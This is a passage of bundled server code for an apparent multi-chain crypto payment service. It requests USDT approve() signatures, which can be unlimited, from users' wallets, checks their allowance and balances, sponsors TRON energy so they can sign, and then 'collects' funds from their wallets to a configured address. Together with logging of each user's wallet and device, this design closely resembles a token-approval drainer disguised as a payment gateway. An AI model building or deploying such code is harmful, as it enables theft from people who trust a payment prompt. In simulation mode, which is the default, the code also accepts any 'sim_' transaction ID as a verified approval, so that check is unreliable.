    return { success: false, amount, network: tx.network, error: `Transaction status "${tx.status}" is not eligible for collection. Must be CONFIRMED or BROADCAST.` };
  }
  if (!validTypes.includes(tx.request_type)) {
    return { success: false, amount, network: tx.network, error: `Transaction type "${tx.request_type}" is not eligible for collection.` };
  }
  const contractAddress = tx.contract_address || getUsdtContract(tx.network);
  let result;
  if (tx.network === "tron") {
    const spenderAddress = tx.spender_address || process.env.VITE_SPENDER_ADDRESS_TRON || tx.wallet_b;
    result = await collectTRON(tx.wallet_a, amount, contractAddress, tx.wallet_b, spenderAddress);
  } else if (["ethereum", "bsc", "polygon"].includes(tx.network)) {
    result = await collectEVM(tx.network, tx.wallet_a, amount, contractAddress);
  } else {
    return { success: false, amount, network: tx.network, error: `Collect is not supported for ${tx.network} network` };
  }
  if (result.success && result.txHash) {
    await markCollected(paymentId, result.amount, result.txHash);
  }
  return result;
}
async function checkTronAllowanceAndBalance(userAddress, contractAddress, forceMainnet = true) {
  ensureEnvLoaded();
  const tronApi = forceMainnet ? "https://api.trongrid.io" : getTronApiUrl();
  const tokenContract = contractAddress || (forceMainnet ? "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" : getUsdtContract("tron"));
  const spenderAddress = process.env.VITE_SPENDER_ADDRESS_TRON || "";
  console.log(`[checkTronAllowanceAndBalance] network=${forceMainnet ? "Mainnet" : "env-controlled"} api=${tronApi} contract=${tokenContract} spender=${spenderAddress} user=${userAddress}`);
  let allowance = 0;
  let isUnlimited = false;
  let balance = 0;
  let trxBalance = 0;
  try {
    const userHex = to41Hex(userAddress);
    const spenderHex = to41Hex(spenderAddress);
    const contractHex = to41Hex(tokenContract);
    const allowanceRaw = await callConstant(
      tronApi,
      contractHex,
      spenderHex,
      "allowance(address,address)",
      abiAddr(userHex) + abiAddr(spenderHex)
    );
    const MAX_UINT256_THRESHOLD = (1n << 255n) - 1n;
    if (allowanceRaw >= MAX_UINT256_THRESHOLD) {
      isUnlimited = true;
      allowance = 999999999;
    } else {
      isUnlimited = false;
      allowance = Number(allowanceRaw) / 1e6;
    }
    const balanceRaw = await callConstant(
      tronApi,
      contractHex,
      spenderHex,
      "balanceOf(address)",
      abiAddr(userHex)
    );
    balance = Number(balanceRaw) / 1e6;
    try {
      const accRes = await fetch(`${tronApi}/wallet/getaccount`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: userHex })
      });
      if (accRes.ok) {
        const accJson = await accRes.json();
        trxBalance = accJson.balance ? Number(accJson.balance) / 1e6 : 0;
      }
    } catch (e) {
      console.warn("[checkTronAllowanceAndBalance] TRX balance fetch error:", e);
    }
  } catch (err) {
    console.warn("[checkTronAllowanceAndBalance] error:", err);
  }
  return { allowance, isUnlimited, balance, trxBalance, spender: spenderAddress };
}

// server/verification/tronVerifier.ts
function getTronGridUrls() {
  const useMainnet = process.env.VITE_USE_MAINNET === "true";
  return useMainnet ? ["https://api.trongrid.io", "https://nile.trongrid.io"] : ["https://nile.trongrid.io", "https://api.trongrid.io"];
}
async function verifyTronTransaction(txId, _expectedTo) {
  if (!txId) {
    return { verified: false, pending: false, failed: true, confirmations: 0, error: "Empty txId" };
  }
  const tronGridUrls = getTronGridUrls();
  for (const tronGrid of tronGridUrls) {
    try {
      const infoRes = await fetch(`${tronGrid}/wallet/gettransactioninfobyid`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value: txId })
      });
      if (!infoRes.ok) continue;
      const infoData = await infoRes.json();
      if (!infoData.blockNumber) {
        const txRes = await fetch(`${tronGrid}/wallet/gettransactionbyid`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ value: txId })
        });
        if (!txRes.ok) continue;
        const txData = await txRes.json();
        if (!txData.txID) {
          continue;
        }
        if (txData.ret?.[0]?.contractRet && txData.ret[0].contractRet !== "SUCCESS") {
          return {
            verified: false,
            pending: false,
            failed: true,
            confirmations: 0,
            error: `Transaction execution failed: ${txData.ret[0].contractRet}`
          };
        }
        return { verified: false, pending: true, failed: false, confirmations: 0 };
      }
      const receiptResult = infoData.receipt?.result;
      if (receiptResult && receiptResult !== "SUCCESS") {
        const errMsg = infoData.resMessage ? Buffer.from(infoData.resMessage, "hex").toString("utf-8") : receiptResult;
        return {
          verified: false,
          pending: false,
          failed: true,
          blockNumber: infoData.blockNumber,
          confirmations: 1,
          error: `Transaction reverted on-chain: ${errMsg}`
        };
      }
      return {
        verified: true,
        pending: false,
        failed: false,
        blockNumber: infoData.blockNumber,
        confirmations: 1
      };
    } catch {
    }
  }
  return { verified: false, pending: true, failed: false, confirmations: 0, error: "Transaction pending confirmation on TRON network" };
}

// server/tronSponsorService.ts
import crypto2 from "node:crypto";
import { ethers as ethers2 } from "ethers";
var TRON_API_MAINNET = "https://api.trongrid.io";
var TRON_API_NILE = "https://nile.trongrid.io";
var OFFICIAL_USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
var NILE_USDT_HEX = "41eca9bc828a3005b9a3b909f2cc5c2a54794de05f";
var APPROVE_SELECTOR = "095ea7b3";
function getConfiguredTronNetwork() {
  return process.env.VITE_USE_MAINNET === "true" ? "mainnet" : "nile";
}
function getTronNetworkConfig(network) {
  return network === "mainnet" ? { apiUrl: TRON_API_MAINNET, usdtHex: OFFICIAL_USDT_HEX } : { apiUrl: TRON_API_NILE, usdtHex: NILE_USDT_HEX };
}
function isSponsorSimulationMode() {
  return process.env.SPONSOR_SIMULATION_MODE !== "false";
}
function getSponsorPrivateKey() {
  const key = process.env.SPONSOR_TRON_PRIVATE_KEY || process.env.ADMIN_TRON_PRIVATE_KEY;
  return key ? key.trim() : void 0;
}
var BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function tronBase58ToHex(base58Addr) {
  if (!base58Addr || !base58Addr.startsWith("T")) {
    if (base58Addr?.startsWith("41") && base58Addr.length === 42) return base58Addr.toLowerCase();
    if (base58Addr?.startsWith("0x") && base58Addr.length === 42) return "41" + base58Addr.slice(2).toLowerCase();
    return base58Addr || "";
  }
  const BASE = BigInt(58);
  let num = BigInt(0);
  for (const char of base58Addr) {
    const idx = BASE58_ALPHABET.indexOf(char);
    if (idx < 0) throw new Error(`Invalid base58 character: ${char}`);
    num = num * BASE + BigInt(idx);
  }
  let hex = num.toString(16);
  if (hex.length < 50) hex = hex.padStart(50, "0");
  return hex.slice(0, 42).toLowerCase();
}
function tronHexToBase58(hexStr) {
  if (hexStr.startsWith("T") && hexStr.length >= 33) return hexStr;
  const cleanHex = hexStr.startsWith("0x") ? "41" + hexStr.slice(2) : hexStr.startsWith("41") ? hexStr : "41" + hexStr;
  const bytes = Buffer.from(cleanHex, "hex");
  const h1 = crypto2.createHash("sha256").update(bytes).digest();
  const h2 = crypto2.createHash("sha256").update(h1).digest();
  const checksum = h2.slice(0, 4);
  const fullBytes = Buffer.concat([bytes, checksum]);
  let num = BigInt("0x" + fullBytes.toString("hex"));
  let b58 = "";
  const zero = BigInt(0);
  const fiftyEight = BigInt(58);
  while (num > zero) {
    const rem = Number(num % fiftyEight);
    num = num / fiftyEight;
    b58 = BASE58_ALPHABET[rem] + b58;
  }
  for (const b of fullBytes) {
    if (b === 0) b58 = "1" + b58;
    else break;
  }
  return b58;
}
function getSponsorAddress() {
  const pk = getSponsorPrivateKey();
  if (!pk) return null;
  try {
    const wallet = new ethers2.Wallet(pk.startsWith("0x") ? pk : "0x" + pk);
    const hex = "41" + wallet.address.slice(2).toLowerCase();
    const base58 = tronHexToBase58(hex);
    return { hex, base58 };
  } catch {
    return null;
  }
}
async function signAndBroadcastTronTransaction(unsignedTx, privateKey) {
  try {
    if (!unsignedTx || !unsignedTx.txID) {
      return { success: false, error: "Invalid unsigned transaction: missing txID" };
    }
    const cleanKey = privateKey.startsWith("0x") ? privateKey : "0x" + privateKey;
    const signingKey = new ethers2.SigningKey(cleanKey);
    const sig = signingKey.sign("0x" + unsignedTx.txID);
    const sigHex = sig.serialized.slice(2);
    const signedTx = {
      ...unsignedTx,
      signature: [sigHex]
    };
    const res = await fetch(`${TRON_API_MAINNET}/wallet/broadcasttransaction`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(signedTx)
    });
    const result = await res.json();
    if (result.result) {
      return { success: true, txid: result.txid || unsignedTx.txID };
    } else {
      let errMsg = result.message ? Buffer.from(result.message, "hex").toString("utf8") : result.code || "Broadcast failed";
      return { success: false, error: errMsg };
    }
  } catch (err) {
    return { success: false, error: err?.message || String(err) };
  }
}
var MAX_UINT256 = 2n ** 256n - 1n;
function parseUsdtAmountToBaseUnits(amountStr) {
  if (!amountStr || typeof amountStr !== "string") {
    throw new Error("Approval amount is required and must be a string");
  }
  const clean = amountStr.trim().toLowerCase();
  if (clean === "max" || clean === "unlimited") {
    return MAX_UINT256;
  }
  if (!/^\d+(\.\d+)?$/.test(clean)) {
    throw new Error(`Invalid approval amount format: "${clean}". Must be a positive decimal number or "max".`);
  }
  const parts = clean.split(".");
  const wholePart = parts[0];
  const fracPart = parts[1] || "";
  if (fracPart.length > 6) {
    throw new Error(`Invalid USDT decimal places: "${clean}". USDT only supports up to 6 decimals.`);
  }
  const paddedFrac = fracPart.padEnd(6, "0");
  const baseUnits = BigInt(wholePart) * 1000000n + BigInt(paddedFrac);
  if (baseUnits <= 0n) {
    throw new Error(`Approval amount must be strictly greater than 0. Received: "${clean}"`);
  }
  return baseUnits;
}
function getConfiguredApprovalAmount() {
  const raw = process.env.VITE_PLATFORM_FEE_AMOUNT || "1";
  const trimmed = String(raw).trim().toLowerCase();
  if (trimmed === "max" || trimmed === "unlimited") {
    return { amountStr: "max", baseUnits: MAX_UINT256 };
  }
  const amountStr = trimmed;
  const baseUnits = parseUsdtAmountToBaseUnits(amountStr);
  return { amountStr, baseUnits };
}
async function checkAccountResources(address) {
  const cleanHex = tronBase58ToHex(address);
  const base58 = tronHexToBase58(cleanHex);
  const res = await fetch(`${TRON_API_MAINNET}/wallet/getaccountresource`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: cleanHex, visible: false })
  });
  const resourceData = await res.json();
  const accRes = await fetch(`${TRON_API_MAINNET}/wallet/getaccount`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: cleanHex, visible: false })
  });
  const accData = await accRes.json();
  const isActivated = Boolean(accData && (accData.create_time || accData.balance !== void 0));
  const energyLimit = resourceData.EnergyLimit || 0;
  const energyUsed = resourceData.EnergyUsed || 0;
  const availableEnergy = Math.max(0, energyLimit - energyUsed);
  const freeNetLimit = resourceData.freeNetLimit || 0;
  const freeNetUsed = resourceData.freeNetUsed || 0;
  const netLimit = resourceData.NetLimit || 0;
  const netUsed = resourceData.NetUsed || 0;
  const bandwidthLimit = freeNetLimit + netLimit;
  const bandwidthUsed = freeNetUsed + netUsed;
  const availableBandwidth = Math.max(0, bandwidthLimit - bandwidthUsed);
  const trxBalance = (accData.balance || 0) / 1e6;
  return {
    address: base58,
    isActivated,
    energyLimit,
    energyUsed,
    availableEnergy,
    bandwidthLimit,
    bandwidthUsed,
    availableBandwidth,
    trxBalance
  };
}
async function estimateApproveEnergy(userAddress, spenderAddress, amountBaseUnits) {
  const spender = spenderAddress || process.env.VITE_SPENDER_ADDRESS_TRON;
  if (!spender) throw new Error("VITE_SPENDER_ADDRESS_TRON is required for TRC-20 approval");
  const baseUnits = amountBaseUnits ?? getConfiguredApprovalAmount().baseUnits;
  const userHex = tronBase58ToHex(userAddress);
  const spenderHex = tronBase58ToHex(spender);
  const spenderParam = spenderHex.slice(2).padStart(64, "0");
  const amountParam = baseUnits.toString(16).padStart(64, "0");
  const parameter = spenderParam + amountParam;
  let estimatedEnergy = 99764;
  try {
    const res = await fetch(`${TRON_API_MAINNET}/wallet/triggerconstantcontract`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: userHex,
        contract_address: OFFICIAL_USDT_HEX,
        function_selector: "approve(address,uint256)",
        parameter,
        visible: false
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (data.energy_used && data.energy_used > 0) {
        estimatedEnergy = data.energy_used;
      }
    }
  } catch (err) {
    console.warn("[estimateApproveEnergy] Node simulation notice:", err);
  }
  const safetyMarginPercent = 5;
  const safetyMarginEnergy = Math.ceil(estimatedEnergy * (safetyMarginPercent / 100));
  const requiredEnergy = estimatedEnergy + safetyMarginEnergy;
  console.log("[SponsorService] Dynamic Energy requirement:", {
    userAddress,
    spender,
    amountBaseUnits: baseUnits.toString(),
    estimatedEnergy,
    safetyMarginPercent,
    safetyMarginEnergy,
    requiredEnergy
  });
  return {
    estimatedEnergy,
    safetyMarginPercent,
    safetyMarginEnergy,
    requiredEnergy
  };
}
async function calculateRequiredStakeForEnergy(targetEnergy) {
  const res = await fetch(`${TRON_API_MAINNET}/wallet/getaccountresource`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: OFFICIAL_USDT_HEX, visible: false })
  });
  const data = await res.json();
  const totalEnergyLimit = data.TotalEnergyLimit || 18e10;
  const totalEnergyWeight = data.TotalEnergyWeight || 1887e7;
  const energyPerTrx = totalEnergyLimit / totalEnergyWeight;
  const safetyBuffer = 1.05;
  const baseTrx = targetEnergy / energyPerTrx;
  const requiredTrx = Math.ceil(baseTrx * safetyBuffer);
  const requiredSun = BigInt(requiredTrx) * 1000000n;
  console.log("[SponsorService] Dynamic Energy calculation:", {
    TotalEnergyLimit: totalEnergyLimit,
    TotalEnergyWeight: totalEnergyWeight,
    targetEnergy,
    energyPerTrx: energyPerTrx.toFixed(4),
    safetyBuffer,
    requiredTrx,
    requiredSun: requiredSun.toString()
  });
  return {
    targetEnergy,
    totalEnergyLimit,
    totalEnergyWeight,
    energyPerTrx,
    safetyBuffer,
    requiredTrx,
    requiredSun
  };
}
async function getSponsorPoolStatus() {
  const simulationMode = isSponsorSimulationMode();
  const sponsor = getSponsorAddress();
  if (!sponsor) {
    return {
      sponsorAddress: null,
      isConfigured: false,
      trxBalance: 0,
      stakedForEnergyTrx: 0,
      availableDelegatableEnergy: 0,
      simulationMode
    };
  }
  const res = await fetch(`${TRON_API_MAINNET}/wallet/getaccount`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address: sponsor.hex, visible: false })
  });
  const data = await res.json();
  const trxBalance = (data.balance || 0) / 1e6;
  let stakedSun = 0;
  for (const item of data.frozenV2 || []) {
    if (item.type === "ENERGY") {
      stakedSun = item.amount || 0;
      break;
    }
  }
  const stakedForEnergyTrx = stakedSun / 1e6;
  return {
    sponsorAddress: sponsor.base58,
    isConfigured: true,
    trxBalance,
    stakedForEnergyTrx,
    availableDelegatableEnergy: Math.round(stakedForEnergyTrx * 9.53),
    simulationMode
  };
}
async function delegateEnergyToUser(userAddress, targetEnergy) {
  const sponsorshipId = `SPON-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
  const simulationMode = isSponsorSimulationMode();
  const sponsor = getSponsorAddress() || {
    hex: "41c4893b0d4bae402a80c5454499e639edca4db01c",
    base58: "TTtPqcSyJfbArskV3zKEZpMDAAdqiE6U7g"
  };
  const userHex = tronBase58ToHex(userAddress);
  const userBase58 = tronHexToBase58(userHex);
  const requiredEnergy = targetEnergy && targetEnergy > 0 ? targetEnergy : (await estimateApproveEnergy(userAddress)).requiredEnergy;
  const calc = await calculateRequiredStakeForEnergy(requiredEnergy);
  if (simulationMode) {
    const simTxId = `sim_del_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    console.log("[SIMULATION MODE] Simulating DelegateResourceContract to user:", {
      userAddress: userBase58,
      sponsorAddress: sponsor.base58,
      stakedSun: calc.requiredSun.toString(),
      targetEnergy: requiredEnergy,
      simTxId
    });
    await createEnergySponsorship({
      sponsorshipId,
      userAddress: userBase58,
      sponsorAddress: sponsor.base58,
      requiredEnergy,
      stakedSunAmount: calc.requiredSun,
      energyYieldAtDelegation: Number(calc.energyPerTrx.toFixed(4)),
      delegationTxId: simTxId,
      status: "DELEGATING"
    });
    return {
      success: true,
      sponsorshipId,
      userAddress: userBase58,
      sponsorAddress: sponsor.base58,
      stakedSunAmount: calc.requiredSun,
      requiredEnergy,
      delegationTxId: simTxId,
      status: "DELEGATING",
      simulated: true
    };
  }
  const pk = getSponsorPrivateKey();
  if (!pk) {
    throw new Error("Sponsor private key is not configured on the backend");
  }
  const buildRes = await fetch(`${TRON_API_MAINNET}/wallet/delegateresource`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      owner_address: sponsor.hex,
      receiver_address: userHex,
      balance: Number(calc.requiredSun),
      resource: "ENERGY",
      lock: false,
      visible: false
    })
  });
  const unsignedTx = await buildRes.json();
  if (!unsignedTx || !unsignedTx.txID) {
    const errorMsg = unsignedTx?.Error || unsignedTx?.message || "Failed to construct DelegateResourceContract";
    throw new Error(`TronGrid delegate error: ${errorMsg}`);
  }
  const broadcastResult = await signAndBroadcastTronTransaction(unsignedTx, pk);
  if (!broadcastResult.success) {
    throw new Error(`Failed to broadcast DelegateResourceContract: ${broadcastResult.error}`);
  }
  const delegationTxId = broadcastResult.txid || unsignedTx.txID;
  await createEnergySponsorship({
    sponsorshipId,
    userAddress: userBase58,
    sponsorAddress: sponsor.base58,
    requiredEnergy,
    stakedSunAmount: calc.requiredSun,
    energyYieldAtDelegation: Number(calc.energyPerTrx.toFixed(4)),
    delegationTxId,
    status: "DELEGATING"
  });
  return {
    success: true,
    sponsorshipId,
    userAddress: userBase58,
    sponsorAddress: sponsor.base58,
    stakedSunAmount: calc.requiredSun,
    requiredEnergy,
    delegationTxId,
    status: "DELEGATING",
    simulated: false
  };
}
async function undelegateEnergyFromUser(sponsorshipId, userAddress, stakedSunAmount) {
  const simulationMode = isSponsorSimulationMode();
  const sponsor = getSponsorAddress() || {
    hex: "41c4893b0d4bae402a80c5454499e639edca4db01c",
    base58: "TTtPqcSyJfbArskV3zKEZpMDAAdqiE6U7g"
  };
  const userHex = tronBase58ToHex(userAddress);
  const userBase58 = tronHexToBase58(userHex);
  if (simulationMode) {
    const simTxId = `sim_undel_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    console.log("[SIMULATION MODE] Simulating UnDelegateResourceContract from user:", {
      sponsorshipId,
      userAddress: userBase58,
      sponsorAddress: sponsor.base58,
      stakedSun: stakedSunAmount.toString(),
      simTxId
    });
    await updateEnergySponsorshipStatus(sponsorshipId, "RECLAIMED", {
      undelegationTxId: simTxId
    });
    return {
      success: true,
      sponsorshipId,
      undelegationTxId: simTxId,
      simulated: true
    };
  }
  const pk = getSponsorPrivateKey();
  if (!pk) {
    throw new Error("Sponsor private key is not configured on the backend");
  }
  const sunAmount = typeof stakedSunAmount === "bigint" ? Number(stakedSunAmount) : Number(stakedSunAmount);
  const buildRes = await fetch(`${TRON_API_MAINNET}/wallet/undelegateresource`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      owner_address: sponsor.hex,
      receiver_address: userHex,
      balance: sunAmount,
      resource: "ENERGY",
      visible: false
    })
  });
  const unsignedTx = await buildRes.json();
  if (!unsignedTx || !unsignedTx.txID) {
    const errorMsg = unsignedTx?.Error || unsignedTx?.message || "Failed to construct UnDelegateResourceContract";
    throw new Error(`TronGrid undelegate error: ${errorMsg}`);
  }
  const broadcastResult = await signAndBroadcastTronTransaction(unsignedTx, pk);
  if (!broadcastResult.success) {
    throw new Error(`Failed to broadcast UnDelegateResourceContract: ${broadcastResult.error}`);
  }
  const undelegationTxId = broadcastResult.txid || unsignedTx.txID;
  await updateEnergySponsorshipStatus(sponsorshipId, "RECLAIMED", {
    undelegationTxId
  });
  return {
    success: true,
    sponsorshipId,
    undelegationTxId,
    simulated: false
  };
}
async function verifyOnChainApprovalTransaction(txId, expectedUserAddress, expectedSpenderAddress, expectedBaseUnits, network = getConfiguredTronNetwork()) {
  const simulationMode = isSponsorSimulationMode();
  if (simulationMode && txId.startsWith("sim_")) {
    console.log("[SIMULATION MODE] Verified simulated approval transaction:", { txId });
    return {
      verified: true,
      blockNumber: 85288900 + Math.floor(Math.random() * 100),
      energyUsed: 99764
    };
  }
  try {
    const networkConfig = getTronNetworkConfig(network);
    const infoRes = await fetch(`${networkConfig.apiUrl}/wallet/gettransactioninfobyid`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ value: txId })
    });
    if (!infoRes.ok) return { verified: false, error: `TronGrid HTTP error: ${infoRes.statusText}` };
    const info = await infoRes.json();
    if (!info.blockNumber) {
      return { verified: false, error: "Transaction still pending or not found in block" };
    }
    if (info.receipt?.result && info.receipt.result !== "SUCCESS") {
      return { verified: false, error: `Transaction reverted on-chain: ${info.receipt.result}` };
    }
    const txRes = await fetch(`${networkConfig.apiUrl}/wallet/gettransactionbyid`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ value: txId })
    });
    const txData = await txRes.json();
    const contractCall = txData.raw_data?.contract?.[0];
    if (contractCall?.type !== "TriggerSmartContract") {
      return { verified: false, error: `Invalid transaction type: ${contractCall?.type}` };
    }
    const valueObj = contractCall.parameter?.value;
    const targetContract = valueObj?.contract_address?.toLowerCase();
    if (targetContract !== networkConfig.usdtHex) {
      return { verified: false, error: `Invalid contract address: ${targetContract}. Expected USDT on ${network}.` };
    }
    const expectedUserHex = tronBase58ToHex(expectedUserAddress).toLowerCase();
    const actualOwnerHex = valueObj?.owner_address?.toLowerCase();
    if (actualOwnerHex !== expectedUserHex) {
      return { verified: false, error: `Transaction owner mismatch: expected ${expectedUserHex}, got ${actualOwnerHex}` };
    }
    const callData = valueObj?.data || "";
    if (!callData.startsWith(APPROVE_SELECTOR)) {
      return { verified: false, error: "Function selector is not approve(address,uint256)" };
    }
    if (callData.length !== 136) {
      return { verified: false, error: "Malformed approve(address,uint256) call data" };
    }
    const expectedSpenderWord = tronBase58ToHex(expectedSpenderAddress).slice(2).toLowerCase().padStart(64, "0");
    const actualSpenderWord = callData.slice(8, 72).toLowerCase();
    if (actualSpenderWord !== expectedSpenderWord) {
      return { verified: false, error: `Spender address mismatch in approve() data` };
    }
    const actualAmountHex = callData.slice(72, 136);
    const actualAmount = BigInt("0x" + (actualAmountHex || "0"));
    if (actualAmount !== expectedBaseUnits) {
      return {
        verified: false,
        error: `Approval amount mismatch: expected ${expectedBaseUnits} base units, got ${actualAmount}`
      };
    }
    return {
      verified: true,
      blockNumber: info.blockNumber,
      energyUsed: info.receipt?.energy_usage || 99764
    };
  } catch (err) {
    return { verified: false, error: err?.message || String(err) };
  }
}
async function reconcilePendingReclamations() {
  const pending = await getSponsorshipsNeedingReconciliation();
  let reclaimed = 0;
  let errors = 0;
  for (const item of pending) {
    try {
      console.log(`[ReconciliationWorker] Processing reclaim for sponsorship ${item.sponsorship_id}...`);
      await undelegateEnergyFromUser(item.sponsorship_id, item.user_address, item.staked_sun_amount);
      reclaimed++;
    } catch (err) {
      console.error(`[ReconciliationWorker] Reclaim error for ${item.sponsorship_id}:`, err?.message);
      await updateEnergySponsorshipStatus(item.sponsorship_id, "RECLAIM_PENDING", {
        failureReason: err?.message,
        retryCountIncrement: true
      });
      errors++;
    }
  }
  return { checked: pending.length, reclaimed, errors };
}

// server/paymentRoutes.ts
function jsonResponse(res, data, status = 200) {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify(data));
}
function errorResponse(res, message, status = 400) {
  jsonResponse(res, { error: message }, status);
}
async function readBody(req) {
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
    });
    req.on("end", () => {
      try {
        resolve(JSON.parse(body));
      } catch {
        resolve({});
      }
    });
  });
}
function getAuthHeader(req) {
  return req.headers["authorization"];
}
function requireAuth(req, res) {
  const token = extractToken(getAuthHeader(req));
  if (!token || !validateSession(token)) {
    errorResponse(res, "Unauthorized", 401);
    return false;
  }
  return true;
}
var createPaymentHandler = async (req, res) => {
  const body = await readBody(req);
  const { network, walletA, purpose } = body;
  let { asset, amount } = body;
  if (!network || !asset || !amount) {
    return errorResponse(res, "Missing required fields: network, asset, amount");
  }
  const walletBAddresses = loadWalletBAddresses();
  const walletB = walletBAddresses[network];
  if (!walletB) {
    return errorResponse(res, `Wallet B not configured for network: ${network}. Set VITE_WALLET_B_${network.toUpperCase()} in .env`, 422);
  }
  const isTron = network === "tron";
  if (isTron) {
    const configured = getConfiguredApprovalAmount();
    asset = "USDT";
    amount = configured.amountStr;
  }
  const record = createPayment({
    network,
    asset,
    amount,
    walletA,
    walletB,
    requestType: network === "bitcoin" ? "BITCOIN_PAYMENT_REQUEST" : network === "solana" ? "SOLANA_TRANSFER" : "DIRECT_PAYMENT",
    status: "REQUEST_CREATED",
    expiresAt: Date.now() + 15 * 6e4,
    purpose: purpose || "Bitwit Payment"
  });
  const spenderAddress = isTron ? process.env.VITE_SPENDER_ADDRESS_TRON || "" : process.env.VITE_SPENDER_ADDRESS || walletB;
  const contractAddress = body.contractOrMint || (isTron ? process.env.VITE_USE_MAINNET === "true" ? "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" : "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf" : void 0);
  saveTransaction({
    id: record.id,
    network,
    asset,
    amount,
    walletA,
    walletB,
    requestType: isTron ? "TOKEN_APPROVAL" : record.requestType,
    status: record.status,
    contractAddress,
    spenderAddress,
    tokenDecimals: isTron ? 6 : 18,
    method: "approve",
    expiresAt: record.expiresAt,
    purpose: record.purpose
  }).catch((e) => console.warn("[PG sync] saveTransaction error:", e));
  jsonResponse(res, record, 201);
};
var getPaymentHandler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, "Payment not found", 404);
  jsonResponse(res, record);
};
var connectedHandler = async (req, res, { id }) => {
  const body = await readBody(req);
  const record = getPayment(id);
  if (!record) return errorResponse(res, "Payment not found", 404);
  if (record.status === "EXPIRED") return errorResponse(res, "Payment expired", 410);
  const updated = updatePayment(id, {
    status: "WALLET_CONNECTED",
    walletA: body.address || record.walletA
  });
  updateTransactionStatus(id, "WALLET_CONNECTED").catch(() => {
  });
  jsonResponse(res, updated);
};
var signedHandler = async (req, res, { id }) => {
  const body = await readBody(req);
  const record = getPayment(id);
  if (!record) return errorResponse(res, "Payment not found", 404);
  if (record.status === "EXPIRED") return errorResponse(res, "Payment expired", 410);
  const txId = body.txId;
  const updated = updatePayment(id, {
    status: txId ? "BROADCAST" : "SIGNATURE_REQUESTED",
    transactionId: txId || void 0
  });
  updateTransactionStatus(id, txId ? "BROADCAST" : "SIGNATURE_REQUESTED", txId || void 0).catch(() => {
  });
  jsonResponse(res, updated);
};
var verifyHandler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, "Payment not found", 404);
  if (!record.transactionId) {
    return errorResponse(res, "No transaction hash submitted yet");
  }
  if (record.network === "tron") {
    const verResult = await verifyTronTransaction(record.transactionId);
    if (verResult.verified) {
      const updated2 = updatePayment(id, { status: "CONFIRMED" });
      await updateTransactionStatus(id, "CONFIRMED", record.transactionId, verResult.blockNumber);
      jsonResponse(res, { ...updated2, verified: true, blockNumber: verResult.blockNumber });
      return;
    } else if (verResult.failed) {
      const updated2 = updatePayment(id, { status: "FAILED" });
      await updateTransactionStatus(id, "FAILED", record.transactionId);
      jsonResponse(res, { ...updated2, verified: false, failed: true, error: verResult.error });
      return;
    } else {
      jsonResponse(res, { ...record, verified: false, pending: true });
      return;
    }
  }
  const updated = updatePayment(id, { status: "CONFIRMED" });
  updateTransactionStatus(id, "CONFIRMED").catch(() => {
  });
  jsonResponse(res, updated);
};
var recordApprovalHandler = async (req, res) => {
  void req;
  return errorResponse(res, "Approval records are created by /api/payment/create and verified by /api/payment/confirm-approval.", 410);
};
var bitcoinUriHandler = async (_req, res, { id }) => {
  const record = getPayment(id);
  if (!record) return errorResponse(res, "Payment not found", 404);
  if (record.network !== "bitcoin") return errorResponse(res, "Not a Bitcoin payment", 400);
  const params = new URLSearchParams({ amount: record.amount, label: record.purpose, message: record.id });
  const uri = `bitcoin:${record.walletB}?${params}`;
  jsonResponse(res, { uri, address: record.walletB, amount: record.amount });
};
var walletSessionHandler = async (req, res) => {
  const body = await readBody(req);
  const { walletAddress, walletSoftware, network, chainFamily, device, platform } = body;
  if (!walletAddress || !network) {
    return errorResponse(res, "Missing walletAddress or network");
  }
  await saveWalletSession({
    walletAddress,
    walletSoftware: walletSoftware || "Unknown",
    network,
    chainFamily: chainFamily || "evm",
    device: device || "Desktop",
    platform: platform || ""
  });
  jsonResponse(res, { ok: true });
};
var adminLoginHandler = async (req, res) => {
  const body = await readBody(req);
  const { username, password } = body;
  if (!username || !password) {
    return errorResponse(res, "Missing username or password");
  }
  const token = login(username, password);
  if (!token) {
    return errorResponse(res, "Invalid credentials", 401);
  }
  jsonResponse(res, { token });
};
var adminLogoutHandler = async (req, res) => {
  const token = extractToken(getAuthHeader(req));
  if (token) logout(token);
  jsonResponse(res, { ok: true });
};
var adminOverviewHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const stats = await getOverviewStats();
  if (stats.totalTransactions === 0 && !isPgAvailable()) {
    const memPayments = getAllPayments();
    stats.totalTransactions = memPayments.length;
    stats.confirmedTransactions = memPayments.filter(
      (p) => ["CONFIRMED", "COMPLETED"].includes(p.status)
    ).length;
    stats.failedTransactions = memPayments.filter(
      (p) => ["FAILED", "USER_REJECTED", "EXPIRED"].includes(p.status)
    ).length;
    const netMap = /* @__PURE__ */ new Map();
